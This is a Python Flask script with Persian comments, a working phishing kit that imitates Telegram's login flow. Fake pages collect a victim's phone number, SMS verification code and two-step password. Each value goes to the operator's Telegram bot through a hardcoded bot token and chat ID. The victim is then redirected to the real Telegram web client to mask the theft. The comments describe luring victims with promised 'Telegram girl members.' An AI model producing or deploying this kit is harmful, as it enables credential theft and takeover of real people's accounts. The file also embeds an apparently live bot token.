# telegram_phish_bot.py
# ظاهر: ممبر دختر تلگرام
# کار: شماره + کد + پسورد رو می‌گیره و مستقیم به ربات تو می‌فرسته

import requests
from flask import Flask, request, render_template_string, session, redirect
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ========== تنظیمات تو ==========
BOT_TOKEN = "8975788060:AAFDUlJk-5btfAj1KH1eZy2WpTOem6jS3Uo"          # توکن رباتت از @BotFather
ADMIN_CHAT_ID = "6286479412"        # آیدی عددی خودت (با @userinfobot بگیر)
# ================================

def send_to_bot(text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

HTML_PHONE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Telegram</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #0e1621; color: #fff; min-height: 100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .container { width:100%; max-width:420px; padding:20px; }
        .logo { width:80px; height:80px; background: linear-gradient(135deg, #2AABEE, #229ED9); border-radius:20px; margin:0 auto 30px; display:flex; align-items:center; justify-content:center; font-size:40px; }
        h1 { text-align:center; font-size:22px; margin-bottom:8px; font-weight:600; }
        p { text-align:center; color:#8b9bb4; font-size:14px; margin-bottom:30px; line-height:1.5; }
        .input-box { background:#17212b; border-radius:12px; padding:16px; margin-bottom:20px; }
        input { width:100%; background:transparent; border:none; color:#fff; font-size:16px; outline:none; text-align:left; direction:ltr; }
        .btn { width:100%; background:#2AABEE; color:#fff; border:none; border-radius:12px; padding:14px; font-size:16px; font-weight:600; cursor:pointer; }
        .btn:active { opacity:0.85; }
        .hint { text-align:center; color:#6ab3f3; font-size:13px; margin-top:20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✈️</div>
        <h1>ورود به تلگرام</h1>
        <p>برای ادامه، شماره تلفن خود را وارد کنید.<br>کد تأیید برای شما ارسال خواهد شد.</p>
        <form method="POST" action="/phone">
            <div class="input-box">
                <input type="tel" name="phone" placeholder="+98 912 345 6789" required autofocus>
            </div>
            <button type="submit" class="btn">بعدی</button>
        </form>
        <div class="hint">با ورود، شرایط استفاده از تلگرام را می‌پذیرید</div>
    </div>
</body>
</html>
"""

HTML_CODE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Telegram</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #0e1621; color: #fff; min-height: 100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .container { width:100%; max-width:420px; padding:20px; }
        .logo { width:80px; height:80px; background: linear-gradient(135deg, #2AABEE, #229ED9); border-radius:20px; margin:0 auto 30px; display:flex; align-items:center; justify-content:center; font-size:40px; }
        h1 { text-align:center; font-size:22px; margin-bottom:8px; font-weight:600; }
        p { text-align:center; color:#8b9bb4; font-size:14px; margin-bottom:30px; line-height:1.5; }
        .input-box { background:#17212b; border-radius:12px; padding:16px; margin-bottom:20px; }
        input { width:100%; background:transparent; border:none; color:#fff; font-size:20px; outline:none; text-align:center; letter-spacing:8px; direction:ltr; }
        .btn { width:100%; background:#2AABEE; color:#fff; border:none; border-radius:12px; padding:14px; font-size:16px; font-weight:600; cursor:pointer; }
        .btn:active { opacity:0.85; }
        .resend { text-align:center; color:#6ab3f3; font-size:13px; margin-top:20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✈️</div>
        <h1>کد تأیید</h1>
        <p>کد ۵ رقمی ارسال‌شده به <b>{{ phone }}</b> را وارد کنید</p>
        <form method="POST" action="/code">
            <div class="input-box">
                <input type="text" name="code" placeholder="• • • • •" maxlength="5" required autofocus pattern="[0-9]*" inputmode="numeric">
            </div>
            <button type="submit" class="btn">تأیید</button>
        </form>
        <div class="resend">کد را دریافت نکردید؟ دوباره ارسال کنید</div>
    </div>
</body>
</html>
"""

HTML_PASSWORD = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Telegram</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #0e1621; color: #fff; min-height: 100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .container { width:100%; max-width:420px; padding:20px; }
        .logo { width:80px; height:80px; background: linear-gradient(135deg, #2AABEE, #229ED9); border-radius:20px; margin:0 auto 30px; display:flex; align-items:center; justify-content:center; font-size:40px; }
        h1 { text-align:center; font-size:22px; margin-bottom:8px; font-weight:600; }
        p { text-align:center; color:#8b9bb4; font-size:14px; margin-bottom:30px; line-height:1.5; }
        .input-box { background:#17212b; border-radius:12px; padding:16px; margin-bottom:20px; }
        input { width:100%; background:transparent; border:none; color:#fff; font-size:16px; outline:none; text-align:center; direction:ltr; }
        .btn { width:100%; background:#2AABEE; color:#fff; border:none; border-radius:12px; padding:14px; font-size:16px; font-weight:600; cursor:pointer; }
        .btn:active { opacity:0.85; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✈️</div>
        <h1>رمز دو مرحله‌ای</h1>
        <p>حساب شما دارای رمز عبور دو مرحله‌ای است.<br>لطفاً رمز را وارد کنید.</p>
        <form method="POST" action="/password">
            <div class="input-box">
                <input type="password" name="password" placeholder="رمز عبور" required autofocus>
            </div>
            <button type="submit" class="btn">ورود</button>
        </form>
    </div>
</body>
</html>
"""

HTML_SUCCESS = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body { background:#0e1621; color:#fff; min-height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
        .box { text-align:center; }
        .check { font-size:60px; margin-bottom:20px; }
        h1 { font-size:22px; margin-bottom:10px; }
        p { color:#8b9bb4; }
    </style>
</head>
<body>
    <div class="box">
        <div class="check">✅</div>
        <h1>ورود موفق</h1>
        <p>در حال انتقال به تلگرام...</p>
    </div>
    <script>
        setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 2500);
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PHONE)

@app.route("/phone", methods=["POST"])
def phone():
    phone = request.form.get("phone", "").strip()
    session["phone"] = phone
    send_to_bot(f"📱 <b>شماره جدید</b>\n<code>{phone}</code>")
    return render_template_string(HTML_CODE, phone=phone)

@app.route("/code", methods=["POST"])
def code():
    code = request.form.get("code", "").strip()
    phone = session.get("phone", "unknown")
    session["code"] = code
    send_to_bot(f"🔑 <b>کد تأیید</b>\nشماره: <code>{phone}</code>\nکد: <code>{code}</code>")
    # همیشه صفحه پسورد رو نشون بده (اگه نداشت هم مهم نیست، بعداً رد می‌شه)
    return render_template_string(HTML_PASSWORD)

@app.route("/password", methods=["POST"])
def password():
    password = request.form.get("password", "").strip()
    phone = session.get("phone", "unknown")
    code = session.get("code", "unknown")
    send_to_bot(
        f"🎯 <b>اطلاعات کامل</b>\n"
        f"شماره: <code>{phone}</code>\n"
        f"کد: <code>{code}</code>\n"
        f"پسورد: <code>{password}</code>"
    )
    return render_template_string(HTML_SUCCESS)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
  
